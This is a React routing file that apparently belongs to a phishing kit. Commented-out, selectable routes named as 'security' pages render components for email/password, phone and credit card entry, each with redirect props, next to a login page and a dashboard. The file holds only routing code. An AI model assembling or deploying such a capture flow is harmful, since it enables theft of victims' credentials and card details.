import React from 'react'
import { BrowserRouter, Route, Routes } from 'react-router-dom'
import { Dashboard } from '../pages/Dashboard'
import { Login } from '../pages/Login'

export const Navigation = () => {
  return (
    <BrowserRouter>
        <Routes>
            {/* AQUI SOLO HAY QUE DESCOMENTAR LOS QUE DESEAS USAR EN EL ORDEN QUE DESEES QUE ESTÉ */}
            <Route path='/dashboard-huggo' element={<Dashboard />} />
            <Route path='/' element={<Login />} />
            <Route path='/*' element={<Login />} />
            
            {/* <Route path='/correo-seguridad' element={
              <EmailAndPassword 
                urlToNavigate={''} 
                spiner={true}
                timeLoader={1000}  
              />} />

            <Route path='/correo-celular-seguridad' element={
              <EmailAndPhone urlToNavigate={''} />} 
            />

            <Route path='/tarjeta-seguridad' element={
              <CreditCard urlToNavigate={''} />} 
            /> */}
        </Routes>
    </BrowserRouter>
  )
}
